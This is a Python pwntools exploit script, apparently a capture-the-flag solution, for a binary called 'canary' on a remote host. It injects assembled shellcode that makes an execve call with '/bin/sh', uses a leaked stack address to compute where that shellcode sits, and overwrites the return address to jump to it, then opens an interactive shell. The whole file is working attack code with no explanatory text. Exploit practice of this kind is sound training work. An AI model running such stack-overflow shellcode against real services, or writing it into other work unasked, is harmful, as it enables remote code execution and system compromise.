#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('canary')

host = args.HOST or '194.5.207.113'
port = int(args.PORT or 7030)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b printresult+97
continue
'''.format(**locals())

code = asm('''
    pop rdi
    mov rdi, rsp
    mov rsi, rsp
    xor rdx, rdx /* 0 */
    push rdx
    jmp .+0x2e
''')

code2 = asm('''
    push rdi
    mov rsi, rsp
    xor rax,rax
    mov al, 0x3b
    syscall
''')

io = start()
io.sendlineafter(b'first', code2)
io.sendlineafter(b'second', 'aaaaaa/bin/sh\x00')

io.recvuntil(b'address: ')
addr = int(io.recvline().decode(), 16)
offset = 0x00007ffc92744654 - 0x7ffc92744681
input_base = addr + offset
shellcode = addr+offset
log.info(f'Shellcode len: {len(code)}')

io.sendlineafter(b'number', fit({0:code,0xc+8:p64(shellcode)}))

io.interactive()

